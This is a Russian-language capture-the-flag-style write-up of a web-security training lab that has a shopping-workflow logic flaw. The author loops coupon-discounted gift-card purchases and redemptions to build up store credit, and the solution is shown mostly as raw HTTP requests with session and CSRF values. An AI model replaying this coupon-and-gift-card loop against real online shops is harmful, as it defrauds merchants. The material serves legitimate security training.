Эта лаборатория имеет логический изъян в своем рабочем процессе закупок. Чтобы решить эту лабораторию, воспользуйтесь этим изъяном, чтобы купить "Легкую кожаную куртку l33t".

Вы можете войти в свою учетную запись, используя следующие учетные данные:`wiener:peter`

## Дано

- логический изъян в своем рабочем процессе закупок
- учетные данные:`wiener:peter`
## Задача

- купить "Легкую кожаную куртку l33t".
# Решение

1. Залогинемся и посмотрим этапы покупки товара
2. Есть купон `SIGNUP30` он даёт скидку на на товар 30% и есть товар подарочная карта на 10$ по итогу мы имеем 3$ за раз

|            |
| ---------- |
| IwRBF9qJvn |
| gtXb5QeLBA |

3. Надо автоматизировать
- Запрос в корзину
```
POST /cart HTTP/2
Host: 0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net
Cookie: session=Qi0M5HErQK2RjFuc4Xbjg4Do3jyrfZBn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net
Referer: https://0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net/product?productId=2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers

productId=2&redir=PRODUCT&quantity=10
```
- Запрос на купон
```
POST /cart/coupon HTTP/2
Host: 0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net
Cookie: session=Qi0M5HErQK2RjFuc4Xbjg4Do3jyrfZBn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: https://0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net
Referer: https://0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers

csrf=B6YgODQMdocCpRfMCr625r15iGYW9IRN&coupon=SIGNUP30
```
- Запрос на покупку
```
POST /cart/checkout HTTP/2
Host: 0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net
Cookie: session=Qi0M5HErQK2RjFuc4Xbjg4Do3jyrfZBn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net
Referer: https://0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers

csrf=B6YgODQMdocCpRfMCr625r15iGYW9IRN
```
- запрос на просмотр купонов
```
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net
Cookie: session=Qi0M5HErQK2RjFuc4Xbjg4Do3jyrfZBn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
```
- купоны
```
                   <table class=is-table-numbers>
                        <tbody>
                            <tr>
                                <th>Code</th>
                            </tr>
                            <tr>
                                <td>QjEXRM8XJN</td>
                            </tr>
                            <tr>
                                <td>DAfd4YnIr1</td>
                            </tr>
                            <tr>
                                <td>pkMilV9qDG</td>
                            </tr>
```
- обнал купонов
```
POST /gift-card HTTP/2
Host: 0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net
Cookie: session=Qi0M5HErQK2RjFuc4Xbjg4Do3jyrfZBn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: https://0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net
Referer: https://0a4c00ee0352386d82a94c0000b200c2.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers

csrf=B6YgODQMdocCpRfMCr625r15iGYW9IRN&gift-card=QjEXRM8XJN
```
